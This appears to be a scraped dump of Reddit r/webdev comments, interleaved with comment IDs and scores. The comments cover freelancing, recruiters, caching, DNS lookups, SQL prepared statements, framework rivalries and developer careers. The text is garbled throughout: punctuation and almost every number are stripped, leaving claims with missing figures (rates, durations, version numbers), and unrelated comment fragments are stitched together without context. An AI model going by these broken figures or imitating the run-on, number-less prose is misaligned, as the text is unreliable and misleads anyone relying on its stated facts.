The last time I was let go from a job my wife and I were at a really good place financially and decided that if I was ever going to try freelancing this would be the time to try it. We had  months of living expenses if I brought in  so there was no time like the present to give it a shot. If I wasnt doing well by  months Id go and find a job elsewhere.I found a few local businesses to do some work for but my bread and butter was from agencies that were outsourcing some of their work. I found a graphic and print design shop a lot of signs car wraps branded products like pens and tshirts etc. but didnt do web work at the time. But they were sick of people asking them to build a website for them and having to turn that business away. We tried a couple of methods of payment  one where Id bill them for my time and theyd bill the client and one where I paid them a finders fee from whatever I was going to collect from the client myself.I had three shops that I was working for for steady work. It was a pretty good setup.Put together a portfolio send it to a bunch of agencies and just tell them youre around for their outsourcing needs.,webdev,d4jcb7g,3,t5_2qs0q

8280408,0,t3_4svz24,In my opinion most recruiters are a necessary evil at best scourge of the industry at worst.Many recruiters Ive encountered know very little about the actual tech... just enough jargon and buzz words to sound coherent.  These recruiters are nothing more than salespeople trying to find candidates for an open position with their client.  Some care very little beyond putting a butt in a seat and collecting the commission.  Recruiters like to build as vast a network of contacts as they can so they can use a simple sales tactic of casting a wide net for an opening and hope to catch something.  Its all quantity over quality.With a decent LinkedIn profile and a resume posted on the major job sites youll get a lot of recruiters contacting you hint dont post your real phone number.  Use google voice something else you can filter or nothing at all.  Many will have jobs out of town for  months and talk big words about extensions and contracttohire which are both usually BS.  Professional consulting is another ballgame though.  These companies will hire you as a full time employee and send you on assignment with their clients.  These jobs usually have a decent hourly rate and come with generally ok benefits more than youd get from the bodyshops.  With many of these firms when you arent on assignment youre on the bench and on the payroll.  They may have you come into the office to do training or other jobs but if they want to keep you around the wont completely lay you off.The people you really want to talk to arent recruiters.  You want headhunters.  These people arent middle men like the contracting companies billing clients for your work then paying you a percentage of the rate.  Headhunters put people in jobs and collect a fee from the client usually equal to the first year salary.  These guys are far more interested in learning what youre good at what you want to work on and where you want to work.  Their livelihood depends on getting the best possible fits for both their clients and their candidates.  As far as getting attention from recruiters most of the time its as easy as having a good LinkedIn profile and a good resume posted online.  Failing that find out what contracting companies operate in your area.  Places like TekSystems Cardinal Cohesion KForce or Robert Half and others will have offices in most midsize and larger cities.  Give them a call and ask to speak to a recruiter about current opportunities.  This will at least get you in their Rolodex when a position comes along for which you would be a potential candidate.Ive been in touch with several dozen recruiters in the last few months. Most of it is just spam no Im not leaving my stable well paying job for your  month contract on the other side of the country for less money.  Some of the jobs they contact me about are actually applicable to what I do.  A few of them even take the time to get to know me what I do and what Im looking for.  Only two have bothered to build a relationship and maintain contact and touch base every few months.  Of all this only  potential real opportunities have presented themselves.  Of those only one went as far as the interview.What Im saying is dealing with recruiters is a grind by itself.  I try to do it as little as possible but with many companies going through agencies to do their hiring its become a game we must all play at some point.  Youll sift through a ton of BS but you may find one or two recruiters that actually care about their job are knowledgeable about what theyre selling to both you and their client and can work to get you your next good job.The other advice I can offer is to network as much as possible directly with other people in your field locally.  Other developers managers directors everyone.  Most of the jobs Ive gotten in the last  years has been because I knew someone at the company that hired me even if I sometimes had to go through contracting companies to get there.,webdev,d5clyyp,4,t5_2qs0q
8287731,0,t3_4szpzs,Downvoted because of the stupid clickbaity title. I read the stupid article as well and feel like this is just stupid. Yeah rd party APIs suck. They suck because its never corporate pushing to have rich robust and well documented APIs they push for features of the core system constantly which is hard to keep track of in developer APIs. This is why the vast majority of people should be using npm packages ruby gems etc instead of interfacing with the API directly. It will cover  of usecases and if your use case is so special you can always contribute it back to the library. JIRA hardly has the worst API ever and opwriter knows it. OAuth is hard but is a much better way of dealing with things and requires running a webserver configuring redirect URIs etc hence the lengthy writeup on it. Google has similar lengthy writeups and hangups. I can imagine the next article in this shitty blog is going to be OMG X uses a RESTful API that means I have to write a HTTP . compliant client,webdev,d5dix78,5,t5_2qs0q

8331803,0,t1_d5i3pfk,If youre using a language like Java you would want to use a StringBuilder instead of the default String class.  Strings are immutable so youd be making a new String for each letter in the original String and then discarding all but the last one.Oracles compiler actually optimizes Strings into StringBuilders at compile time which is a great fun fact to know.  Unfortunately the compiler isnt smart enough to optimize concatenating Strings in a loop like in this example so you cant rely on the compiler in this scenario.,webdev,d5j14b5,1,t5_2qs0q
8333170,0,t3_4tp23j,Best practises are typically suggested by more senior developers. To me this is one of the core differences between senior and lower level developers. To a junior just making it work is the hard part. To a more experienced developer though most problems are solved problems. An experienced intermediate developer wants to find the best most efficient solution etc. They hone those skills.Senior developers know that performance is largely irrelevant and actually solving problems is easy. Security is a given. What is hard is maintainability. Having a solution that works for  people as well as . Having a solution that scales to  developers. Having solutions that remains stable even as it gets more complex. Having testable maintainable consistent stable solutions. Thats the job of a senior. A lot of the time this is counterlogical or counterintuitive to less experienced developers. Use of existing frameworks of design patterns of libraries and abstractions... to a less experienced dev this just looks like... bloat. Because making testable code is hard. Making maintainable software structures is hard. It requires indirect and abstracted code patterns. If someone is suggesting a best practise that seems to you to be pointless and unsupportable theres a pretty good chance that the reason is testability and maintainability. ,webdev,d5j79nx,4,t5_2qs0q

Remember that nothing is truly impossible to trace.  Summarize paraphrase etc. when someone is genuinely confused be an ally to them.  I realize hes being a jackass but this is not a time for you to make a statement or show off your knowledge.  If you make him feel stupid especially in front of his other team members this will only end badly. Instead respond politely individually with an explanation and helpful links and if this person is senior to you offer to use different placeholder.  Publicly continue as though his last message hadnt been sent.  People will forget as long as nobody makes a scene.  In the best case this guy will recognize that you handled things with grace and youll have greater trust and freedom moving forwards but honestly if all that happens is the conversation ends without escalating youve won.,webdev,d5jm92q,16,t5_2qs0q

Have a cron job clean up your cache.Id strongly suggest using a caching layer Redis Memcache etc. not using a database for the API data.Ive worked with a similar situation in the past. I requested API data stored it inside Redis then linked that unique ID inside of my own database just to keep track of some statistics number of times cleaned up average lifetime lifetime per request number of requests timestamps per request IP logs data differences hashes etc.We used to keep expired copies of data around just in case the API was ever down. But that only gave us problems because the caching layer became way too big and the API was pretty reliable.Also an API can provide in the headers for example when the data expires. You should use that to expire your data internally. And create your own tooling to manually expire data too.,webdev,d5kqqkf,5,t5_2qs0q

Sure if youre working at a place that can support this kind of waste go for it but please consider the following who will maintain this software long term?  What happens if you leave? take your best estimate for completion and double or triple it. I can tell you with  confidence that using off the shelf gems to accomplish this is impossible.  Certainly you can cut some corners but every additional dependency has a long term cost. you listed seemingly easy features to build.  Hint they are not.All of this being said RoR is a fine framework and can be used to build nearly anything.  If I had to choose a language and framework to rewrite my software in it would likely be elixir and Phoenix now.  It solves problems ruby just isnt equipped to handle.  I still love ruby.Find an existing CRM and use it.  Nothing will be  perfect for your individual needs.  However if you can get  of your business requirements out of the way thats good enough.Note that you can also build custom addon for salesforce which is basically the goto CRM of medium to small business.,webdev,d62lq91,5,t5_2qs0q

I dont want to be a web dev that just churns out wordpress sites with a theme applied for small local businesses. I mean I guess I would have to start out that way but I want to get to the point where Im making large custom sites as part of a team for big name companies paying big bucks. I have taken a similar grid system Cutegrids I believe it was and stripped it down for my purposes so that i have minimal bloating and it has worked well for me so far.

8718928,0,t3_4zfza3,Any time youre learning something new and you find that youre struggling to grasp concepts it means at least one of two things. Youre going too quickly and not allowing enough time for it to sink in. The learning material is not paced correctly and doesnt take enough baby steps from one concept to another.Keep in mind that the process of learning literally involves your brain rewiring itself as you sleep. The more you try to learn at once the less efficiently your brain can form new neural pathways to account for all of that information. Breaking off learning into small digestible chunks letting it settle in your brain for a day or two and then reinforcing what you learned is vital. It sucks because it makes you feel like youre going slower than you can but learning is just like eating  your body doesnt tell you when its had enough immediately theres a delay. So just be conscious of this when learning. It takes time for your brain to structure itself to allow for efficient processing of new concepts and theres only so much it can handle at once.,webdev,d6vi828,3,t5_2qs0q

It has gotten even better than people realize lossy encoding stored losslessly tiled renderering layers better YCoCg compression but with each change comes with a potential change in the Bitstream. Meaning that the FLIF decoder wont be able to decode older or newer FLIFs. The files produced are only usable with that version of FLIF.With that said it has early support in several ways. Firefox reached out and has asked to be informed of when FLIF is stable enough to go into their experimental build. ImageMagick has an accepted proposal to add FLIF encodedecode support into convert There is a Windows plugin that enables FLIF support across all applications that use the standard image library for previewing and saving to images. There is a Windows plugin for  FLIF thumbnails in Explorer There is a proposal to have FLIF lib added to DebianUbuntuZorinEtc.

For example see this documentation on how to flush your system.While you are at it it is a really good idea to learn how to get DNS records straight from your OS rather than getting it indirectly from your browser. It makes figuring out these sorts of issues really easy. Assuming you are using Windows try this in a command prompt    nslookup debug www.myserver.comPay attention to the ttl and default ttl. The first is how much longer you personally will have to wait for your OS to fetch fresh DNS data. It should decrease for every second you wait  and once it counts down to zero or immediately after you flush your DNS cache a fresh DNS request will be made. The second is how long the OS is supposed to wait between fresh requests. Keep in mind that some networks e.g. large corporate networks ignore this value and cache all DNS values for much longer periods.Getting TTL values right is tricky but worth learning. ,webdev,d7vmeyz,1,t5_2qs0q

9031237,0,t3_53ycz3,Id say the main problem is that old coders from the desktop world used to let the frontend part to the OS. It was possible to use different frameworks to build the frontend part Visual things from crosoft Qt Java etc but coders never need to design nor a single button. Same for routing cache database etc etc. They just interact with premade classes to do all those things. When they come to Web Dev they suddenly realize that all the frontend part must be coded that the principle of webdev each website can have a different design. So they dont understand why they need to learn CSS JS HTML etc. They cry like babies about those languages because they dont understand their logic.Why cant I use QMessageBox to render a modal? crylikeababySo theyre waiting that WebDev become like Desktop dev so they dont have to worry about frontend languages. Indeed the contrary is happening CSS HTML JS can now be used to design desktop apps see the electron framework and we can bet that in the future all desktop app will be indeed webapp in a container. Also if desktop dev didnt care about frontend database routes etc.. they really loved to spend a lot of time to be as close as possible to the hardware debating hours about type casting compilation mulltithreading etc. Compiling for  bits or ARM architecture that was their point. WebDev most of the time is based on scripted languages PHP Ruby JS etc. Even when using old compiled language advanced frameworks are used to deal with the complexity of webApp patterns like routing. A good WebDev doesnt care about CPU RAM and threads. A good webdev knows perfectly well how to use a framework. So the priorities are just totally different. In the past Desktop dev priority was to fit the hardware and didnt care about design routing and database. WebDev priority  is design routing database  and doesnt care about hardware.  ,webdev,d7xeu4x,2,t5_2qs0q

9148327,0,t3_55l8er,gt Ive seen many people suggest setting a default font size on the body and using ems and rems to style from thereThat wont work because the body is not what the root element is the root element is lthtmlgt. Rems are related to the root element not body. Thus if you want to create a scale its more consistent to set via REMs then EMs because it always refers back to the root element for font size note the default is px.Ems however refer to their parent element for font sizing which as you can imagine can get quite complicated due to nesting.gt if you do that will low vision users still be able to customize this using builtin browser settings?If you use the method above? yes because browser settings essentially override the root element styling thus your rem values should also be affected and scale up proportionately.Would i use this? Nah?If you only need recent browser support i dont offer full legacy support with what i code use calc with viewport units.

9159302,0,t1_d8cddcx,I should clarify. Im not arguing the content. I disagree with some of it such as the scope of discussion around larger frameworks like Angular and Ember overreliance on performance use of subjective weasel words like easier and more flexible and the lack of published benchmarking. But regardless thats not the real issue here.I have no issue with you guys publishing this page. Advocacy is your job. The issue I have is with people uncritically posting it as an expert opinion.Again its not the content. To make an analogy if I read an article about vaccination rates and sideeffects on The Lancet or Medicine.gov Id treat it very differently to an article on VaccinesKillBabies.com. Even if it was the same article. Because there is an inherent bias to the source that means even wellmeaning facts are subject to woeful misinterpretation.If I saw this same article on Medium for example Id take it more seriously. If people posted this article on Medium as a discussion of Vue by comparison to other frameworks Id take it more seriously. But an article written by CocaCola on how CocaCola compares to other colas and which happens to find CocaCola the best in all respects published on the CocaCola website... deserves nothing but suspicion. This is absolutely no different. Like it or not honest or not accurate or not. People posting it uncritically should be embarrassed by doing so.You dont have to be inaccurate or dishonest to be misleading.For example gt Vues template syntax harnesses the full power of JavaScript expressions while Handlebars expression and helper syntax is quite limited in comparison.Handlebars helpers arent intended to provide the full power of JavaScript expressions theyre intended to provide a limited set of core functionality which can be extended to work towards more specific helpers. Lauren Tan DockyardNetflix did an amazing talk recently on the flexibility and utility of handlebars helpers and the benefits of this simplicity vs functionality. Id link it but I cant find it on mobile. If youre interested its called I can write my app with no handlebars and was at the Ember Camp  in London a couple weeks ago.Im not saying the above statement is untrue. Im just saying that its made as a simple statement of fact unchallenged and without nuance or discussion. It is more accurately an opinion. I know you say you try to avoid bias but that bias is inevitable because youre on the Vue core team. You say for example that Vue provides flexibility. As a crazed Ember fanboy with no will or thought of my own theres nothing I want less than flexibility.  Its one of Vues biggest benefits. Or hazards. The point Im trying to make is that my mindset affects my perception and so does yours. You value flexibility and freedom you must do or you wouldnt be using and contributing to Vue. I value architecture discipline and consistency. And I hate build tools. This is why I love Ember. When you tilt your point of view to prioritise different things frameworks all look different from that new perspective. Its not just the opinions that change its the facts.Again  its not about accuracy. Its about people posting this article uncritically. Saying youre trying to be unbiased doesnt mean youre unbiased. Thats not what bias actually does. If youre trying to be unbiased why does everything tilt towards Vue? Is it really better than every other framework for all use cases in all occasions for every project? Or has some bias slipped in?Sorry about the rant.,webdev,d8d0c0w,2,t5_2qs0q

If so then you have nothing to worry about. Side note Im  I feel like Im  and able to work like Im . So... whats the whole deal with this age?If you are good coder and to me it looks like you might be one then the world is open for you. Just one example If you can handle older technologies ...Visual basic? Access? whatever just picking two then you might actually be in a sweet spot. There is serious demand for senior developers handling older technologies these are highly paid jobs because the offer is in limited supply and decreasing with time as senior developers age. You just need to  fish for a proper job and with your experience I have no doubt you can nail the right one. Demand for experienced developers is increasing while offer is kind of lagging behind. Especially for older technologies as I said but not limited to. Finding the right job is not an instant process but I dont see the whole reason to worry.Side note you dont need to be master of anything. There is plenty of work to be done by the jack of all trades. Im a jack of all trades and I dont work for cheap. Im reading in between the lines that you are underestimating yourself.

9257857,0,t1_d8pdovi,Its the  non competing part that gets you out of it. In many cases there are competition specifics in the wording. It has to be there since obviously if youre hired as a programmer they cant claim ownership of a house you built. If theres no such wording unlikely which specifies the boundaries of what competition is then thats the part you can negotiate. If you try to negotiate the clause being removed entirely youre asking the company to forfeit its own protections which wont get you very far. If you start a business based on the knowledge you acquired while being paid by a company which competes with the company youre working for theyre going to have problems with that. And thats reasonable. Thats why its important to talk to the people who would be responsible for enforcing the contract. Its not about we swear we wont enforce it because they will enforce it if required to protect the interests of the company. Thats why its there. And you should have it with your own company if you start one.Its about understanding where their concerns are. The reality of when youre going to have problems is very different from what the legalese in the contract sounds like.

It also means that on your next project when realize you had already solved a similar problem in one of your random scripts you can just search your SCM history for the code. If youre a professional developer you use a SCM of some sort so its good that youre getting experience with one while still in school.

9430956,0,t1_d9arwsy,gt it would be cumbersome for me to work on a user control commit my changes wait for my designer to make his changes commit and then have to review everything.Well how do you do that currently? work on a user control commit my changes wait for my designer to make his changes designer commits his changes review everything.The addition of the commit steps should only add between  seconds and  minutes of additional work. And the value you get from having a commit history you can review or revert back to when theres a problem pays for that additional time.Give your designer a good git gui like... wait are you using windows? I dont know a good one for windows.If your designer happens to be on a Mac I suggest SourceTree or Tower. The most common aspects of using git are childs play with a good gui after youve done them about a dozen times even for designers who dont code.gt Also how do you handle database changes? Theres not version control for that right?I dont know how the grown ups do it with the live data of a living project. But typically youd have an initial install version of your database schema and minimum example records in a .sql file that you keep in your repository.Most people probably add a database migration script for each change versus editing raw sql syntax.,webdev,d9bfsbf,1,t5_2qs0q

You want to have a repository for just the things youre developing or fixing such as themes and plugins. This is so you and the other developer can work on the same code.For testing and moving the site around use a backup plugin for Wordpress like backupbuddy or I prefer Akeeba Backup Google for it its no longer in the Wordpress plugin directory but is still being actively maintained. That way you can develop and test locally or any other machine and not have to worry as much about migrating databases. Once youve got to a point that you want to upload your changes to the themeplugin that youve merged with the other developer take another backup of the live site load your changes in your test machine or locally if that is your test machine and simply reupload a new backup live once youre happy with your new changes.,webdev,d9iukox,1,t5_2qs0q

If you have  million users interacting at the same time on your web app and not only to print hello world on the screen even with a good cache system the slow DB performances of Laravel and its super high memory usage will be a huge problem. Thats probably why its not used by any websitewebapp with a huge traffic. For big professional projects people rather use Yii Symfony Rails or .NET. They dont use Laravel or PHPCake. Make the difference between a good framework to learn and a clean performant professional Framework.A lot of Laravel users are very scared by those kind of assessments.

For the disenfranchised this goes for most poor and uneducated people not just minorities there exists a glass ceiling. Telling them that if they just tried harder they could can achieve anything is not true. Poorer people are less able to take risks since they lack the safety net wealthier kids have. Poorer people have less opportunity than wealthier kids have. This is then compounded when you are also black as the people that might be hiring you have a subconscious biased against you. So telling them they should just try harder is always good advice but it glosses over a larger issue.Im not saying pointing out racism is a silver bullet. Im also not saying The signal is that there are systemic problems that cant be changed because people in power are guilty of having power Im saying that examining ones biases and attempting to eliminate them is an important thing for a heavily society.

My first question would be how the current system works as it is now and how much of it would have to change to work with web clients. If it works as is Id personally leave it be.If REST is ruled out now but is an option down the road you might think of building the current application so that all API requests are issued via a single adapter or mediator in the client application. When you are ready to switch providers you can simply swap it out with a the RESTful one without making any other changes to your client.,webdev,dam08qe,4,t5_2qs0q

9966456,0,t1_db6n8l0,Yeah I probably could have worded things a bit better. The only issue I have with it is the lack of a way to actually visit the site whos link you just clicked.A link no longer leads to an address on a domain it leads to a onepage copy of an address and thats it. In fact it actually seems to work to prevent you from visiting the actual site the link purports to lead to.And sure its optional for the site to use it or not and thats the way it should be. So why isnt it optional for the visitor as well?Not that it needs to be. There just needs to be a way to continue to the linked content the actual content with all of the related features provided on that page alongside that content by that site.Its effectively the same thing as replacing the page with a PDF. Which as you and others have said is fine for static content sort of. Even if its just static content you are still losing much of the standard functionality youd expect any site to provide both inherently because its a website and weve come to expect certain things from websites and especially if youve already been a user of that site and have certain expectations of that site based on past use.It seems like the simplest thing in the world to fix too. There just needs to be one link or button or something to load original version.

9978926,0,t3_5ifthu,As mentioned already youre not escaping the correct code. HTML entities like ampamplt  are meant for escaping HTML characters not JSON or JavaScript strings. If you end up with those strings as such in your body your code is executing flawlessly since the browser doesnt see any HTML in the output all the tags are escaped. Form what you pasted youre working with a proper JSON string. What you need to escape are double quotes by using a single backslash just ahead of each one eg  and leave all the HTML tags intact.An easy way to do this would be to paste the raw HTML into your editor and replace all  with . Then to output var view  JSON.parsedata then document.body.innerHTML  view.articleOneAs far as I can tell that should work.

I thought they were new variables sort of created on the fly so if you modified a passed argument then the arguments object would not change. Not sure why I thought that...I guess I was thrown off by how the properties of the arguments object is both indexed and they have names. The fact that you can reference the arguments object both by index and by name and referencing by index requires arguments but by name doesnt made me sort of assume that the arguments array was completely separate from the named arguments.

Then it was backbone then right when the company was getting its junk moved from Adobe to backbone we hired a bunch of AngularJS younglings and suddenly we were in that mess.I remember looking at one of my friends in the eye as he was barking about web components and the future and how angular was it. I made that SOB sign a piece of paper that said I solemnly swear when you read this in  years we will all be using web components and AngularJS will be the plain vanilla web along with coffescript.Well guess what? Its  years and we have a mountain of coffeescript and AngularJS to migrate to reactjs and flow and ES.Lovely.My point?Welcome to what I call the nonstop MVC meat grinder. It eats everyone alive and grinds out bad code for us to all go back and rewrite. Its like the punishment of Prometheus only with nonstop new MVC frameworks eating us every year.How to recover?Realize your joy is when you jump on Vue.js first or something else and out memorize them and spout how youre going to write everything in that? Maybe?...Isnt that what they do though. Out memorize each other and then hold onto that information as long as they can?Just realize it gets easier learning each thing again and again.

10210356,0,t1_dc1dwdb,Yes as long as you use the preparebind methods. The i stands for improved. The biggest issue with mysql functions is the lack of preparebind which sends over the query and data separately. Mysql sees a placeholder and that tells it to go look at the data for the value. Previously you had to concatenate the query together meaning that unless you were very careful and often times even if you still were careful you likely just opened up yourself to sql injection PDO and mysqli do allow for concatenation no way to prevent that but also now support preparebind which is what everyone should be using. Its easy to use offers better performance and is practically immune to injection. However even when given the right tools people can still use them wrong.,webdev,dc1eg9d,8,t5_2qs0q

I feel like its very rare that someone with experience with both options makes claims like this.PHP probably SHOULD be faster as it was build as a wrapper around C functions for the web specifically but thats hardly conclusive and benchmarks need to be done on a case by case basis to mean anything.,webdev,dc3qeww,1,t5_2qs0q

I know that PHP is a great language tried and tested and is still relevant and growing today. My point isnt even necessarily about merits of one over the other more so the difference in the culture and full tech stack of teamcompany that use them. Let me elaborate... If go to a jobs board and search for a PHP dev role  of what I come across is looking for Strong PHP Experience with JavaScript HTMLCSS MySQL version control bonus. Where as if were to look for a python position I come across a far more demanding job specs looking for AWS Docker Vagrant Chef Puppet ReactAngular Jenkins amp test driven development MongoDB Redis and much more.

HTML  CSS and usually also JS are the critical tools to help you accomplish that.Form my experience a lot of companies hire full stack because they want people to have a broader understanding of how everything comes together with design on one side and back end dev on the other.

On top of the flat rate add your hours worked  rate.  is pretty low but you dont have much credential to warrant a high price for now. Just know that experienced people charge up to  an hour easily.gtIs it normal to charge the maintenance job by the month?They have to pay hostingdomain name costs per month or year anyway. Its perfectly normal to charge for changesupdates to the site. If a request comes in perform the update track your hours and make sure to not lose the emailscorrespondence. You can then present a list of all the updates  hours worked on them on a monthly or yearly basis.A few notes Please make sure you use a CMS. There are a loot of thirdparty tools out there that help you track orders requests and time spent working on them. You should use them. If you bill sloppy you wont be taken seriously. Get some proper software that generates nice invoices and enter everything in detail. Invoices should be clean comprehensible and correct. The  figure I gave you is very low.

10866529,0,t3_5vari3,The problem at least with my local college is that the professors teach outdated technology. First of all since I wanted to be a web developer there were no classes for that kind of thing. Setting that aside there were two or three classes on fundamentals which is great. But other than that I heard that there was a Java programming class that I saw some assignments that the students were doing. This was most of the way through the semester and in preparation for the final.Apparently all through this Java class the teacher had never taught about classes. There were no OOP principles taught in the only Java class that a computer science major took. This wasnt an intro to Java this was the Java class.Now how is it in  at the time that a Java class would be conducted where they didnt talk about OOP even once? Thats ridiculous.Now Im sure there are better schools and the fundamentals class wouldve been useful but there are so many books out there about programming that if you like to read you can learn the same fundamentals from the Internet.All you need to start programming is a computer. You can very quickly start getting hands on experience as soon as you start learning.That is why selftaught devs can be just as good if not better than traditionally taught developers. Of course it all depends on how dedicated the person is.I spent two years at college but I wish I hadnt gone at all and spent my time programming instead. I would spend all day just programming things. Stupid things like recreating a task list website over and over again with the new stuff I was learning. First I did it in just JavaScript then I used jQuery then I added a PHP server backend. On and on I just kept programming and programming. And I could beat any of the students who were in my colleges computer science classes if we competed in a language we both knew because I spent my time actually doing the work while they just spent their time thinking about it.Going to a trade school to become something like a mechanic is useful because it can be hard and expensive to practice automotive work on your own. If you mess up a car engine youre out thousands of dollars. If I mess up a PHP server then I just rewrite some files.Actual experience always trumps traditional school learning in my opinion and programming is one of the first big careers where its feasible to get actual experience without going to school.,webdev,de0t02g,2,t5_2qs0q

Instead here youve dismissed the reputation of those taking their time to assist you by calling their opinions unfounded and demanded that they reinforce their criticism. Rather than seeking clarification you double down on your effort to defend your intentions which to them is irrelevant. Youre not asking us to critique your intentions youre asking us to critique how you are perceived.You are seeking their advice they are not asking you to explain your decisionmaking but rather offering their opinions. If you disagree with their opinions seeking to change them isnt in the course of an usual critique. Instead understand that this is how youre viewed from a position outside of yourself which is valuable information.

Again deployment is how you get your code from your development environment to your production environment. gt Any information about the differences or whats going on behind the scenes in a modern web app ...It works the same way as it always has. A Common Gateway Interface CGI passes your code to a serverside parser returns the output to your request handler. It doesnt matter whether its PHP Ruby Python Perl.

Do you think your company is not pushing sales because they dont think they have dev capacity or they just cant sell more work?Maybe give them a hint that you have some capacity and if they get more clients you could handle them. Try to be subtle.Otherwise if you get paid hourly they may just cut your time or perhaps if they learn you are much faster than others give you work vs someone else and cut their time.If they plan to get busier and dont want to cut you may get asked to do things you dont like. Documenting things automating some manual process for payroll that literally cant be automated because its messed up etc...My advice is to do what you want first without asking. Build tools that you would need or think your department may need. This way you are somewhat in control of what that time goes to.

11142248,0,t1_db25bkj,gt The major advantage JSXReact.createElement provides is in debugging and safetyAnd the major disadvantage is that designers need to learn JS to be able to write HTML and CSS.

And since designers most probably wont be able to modify JSX without breaking it writing CSS will be a pain.When using templates specially with Vue you can easily tell a designer to work on a particular file with easy to read HTML and scoped CSS SASS whatever.In the Facebook world where everyone working there is a superhero yeah React makes sense.

As far as his skills are concerned he is limited to marketing agencies and such which are pretty bad in terms of technology and have lots of turnover I speak from experience... they also lowball people and dont give a fuck about quality as much as they do churning out shitty project after shitty project as fast as they can. What I would suggest is taking a look at local companies career pages and thoroughly searching job boards not necessary to apply but so that he can have an idea of what the hot skills in your area are based on job descriptions.For example in my area C.NET and Java are popular for application development which are skills that can easily be applied to software development as well and thus have more longevity and growth potentialwhile WP is used in tiny companies with notsobig projects and clients. The meetups for WP around here are filled with old people because its such an easy skill to pick up compared to the technology thats out there.It sucks to keep changing tracks but since hes come this far and because learning new skills is required if he doesnt want to stay in one place for a long time I highly recommend he learns about MVC REST APIs SQL and OOP some data structures and algorithms because as of now hes really more of a frontend guy. If hes got a good understanding of programming principles it shouldnt take that long you can kill  birds with one stone by developing an application that uses most of what I mentioned.Im not saying this to discourage himyou its more something to keep in mind as he works his way up.,webdev,df47lf6,1,t5_2qs0q

It is under very active feature development is constantly improving and several large projects such as Symfony have roadmaps extending several years.gt  Is it any harder or easier to learn than JS?PHP is an easy language. If you already know JS then youll probably be able to pick up PHP with no problem.gt  Would Node be a better choice for back end?See my answer to  same story here. And likewise for Python.gt Looking for a career in web dev and I want to invest my time wisely because I am already in my mid s.If youre diligent you can pick up all  of those languages within a year. Once you know programming picking up new languages is just a matter of learning the syntax and subtleties. ,webdev,dfhalu4,5,t5_2qs0q

11429525,1,t3_635gxy,gt is it possible to live a healthy relatively balanced lifestyle as a web developerNope. Sorry. There is no way to reverse the effects of sitting in front of the computer for this long. If you do normal  hour days you can mitigate it a bit with extra curricular activities. But if you are trying to excel at this job and not just get a paycheck then you are probably doing way more hours than that.Eventually no matter what it will catch up to you. Your hip flexors will shorten. Your spine will bend. You will start to get back pains. You will struggle for years to keep fit by jogging or going to the gym but in your body something will give out and youll injure yourself an inevitability when you are lacking mobility. Then you wont be able to keep up with the jogging or gym for a while. Youll just be sitting. And sitting. And when your injuries are healed you will try to get back into exercise but its suddenly sooo much harder. Things hurt that you swear werent hurting before. And this cycle continues until you are just in too much pain to exercise at all. Then its all down hill from there.This will happen no matter what. The only thing we can do is try to put it off. It might happen when you are  or . My advice is stretch your hip flexors and back. And strengthen your glutes. That is probably the part of body that suffers the most. Take up yoga or something. Maybe if you are lucky you will retire before it gets too bad.And thats the goal we should all be working for. To get out of this business before it kills us. Make enough money to retire or at least cut back on work enough to find a balance.

Better to use one setup for you than to try and setup something you dont understand.Edit Helmet is a great suggestion but it requires understanding middleware and how to pass tokens from forms etc.  It doesnt do it for you like Rails helpers and ujs do.There is more as well such as how easy it is for Node to create a self referencing variable that cant be garbage collected and how that can be exploited to take down a server.  Memory management in JS is hard especially without threads to isolate leaks.  Node requires advanced understanding to use effectively it is not nor will it ever be something that a novice can pick up and run with without crashing.

11593097,0,t1_dg9xmi7,Well one thing to note is that packages written in either could be used by the other. Both TypeScript and Reacts popularities will guarantee that Reacts TS type definitions will be maintained. One difference between Flow and TS is that Flow only adds types. You will most likely combine it with Babel or some other transpiler to use newer JS features than your runtime supports. Both Flow and your transpiler still must support the new feature for it to work and sourcemaps do get more tricky the more layers you add. TS is a superset of JS that includes an integrated transpiler with great sourcemap support that comes from being integrated. Types for decorator parameters and such just work because decorator support is part of TS whereas Flow will only ignore them to be processed by your transpiler.Flow definitely is more permissive in inferring types. This allows Flow to provide more type inferences where TypeScript may just fallback to any but Flow can also provide inaccurate types until more annotations are added. With configuration TypeScript can definitely be tightened down to be even stricter.That said your choice of framework just might be the deciding factor for you. With Angular  it is just way easier with TypeScript although you can put together a Babel setup with Flow and decorators to mimic it. With React unless you want to use decorators or other newer features of JS with types Flow might turn out to be easier although TS does include jsx support.,webdev,dga33kf,6,t5_2qs0q

In broad strokes to build an ecommerce site you need to be able to. Manage a shoopping cart in your case  one for USD gt UCD and one for UCD to products. Accept payments in USD for this you need a payment gateway. Present a secure site for consumer confidence see comments on HTTPS below. a way to list products for sale manage inventory if applicable manage details on the products themselves and display all that.. Some standard heres who we are and what we do site static pages.An outline of your problem solving for that mike like something like what follows Ecommerce Site with alternate currency users buy currency in USD spend currency on products sold via site USD goes to charity   investigate ecommerce platforms for altcurrency compatibility sellfy shopify bigcommerce etc      If there is a platform that can support altcurrency legally consider building ecommerce site against this platform   build ecommerce platform from scratch      webserver to serve pages and storefront also to be  endpoint          depending on language of application server this might be embedded IE PHP hosts using Apache          else investigate how to setup Apache nGinx etc.          look into HTTPS cert  is a good start          static pages about us why do this mission statment contact us etc.     application server to process transactions          add to cart          remove from cart          list items          paginate item list          display item details          manage items and inventory if applicable          user feedback and rating system stretch goal?     shopping cart system for products purchased with altcurrency          use outofbox solution support for altcurrency          custom               investigate tutorials and articles on basic shopping cart management systems for language of choice     shopping cart for altcurrency purchased with US         use out of box solution possibly use ecommerce platform from above shopify etc.     gateway for processing US to altcurrency transactions         possibly integrated into shopping cart for same         this is not something you build its a service you integrate withI know its a lot at first glance but a lot of that is investigation.

I know Java and C are big in enterprise apps but so much of the web is php ruby js and python.  Java is probably the fastest language in common use but PHP  is pretty fast PHP supports type hinting but this is a feature I have personally never used.

11693354,0,t3_66uk65,If your only option is to use JavaScript to load the dropdown youre going to be looking at using a combination of a serverside page for returning a data payload and some sort of clientside framework to bind the dropdown.For example your php page would return a json payload and you would call it using jQuerys .getJson method. You would then loop through the returned data and add your dropdown elements.Bear in mind that the serverside bits will have to be on the same donation as the page you will be manipulating otherwise it will likely be subject to CORS blocking.,webdev,dglgkf8,1,t5_2qs0q

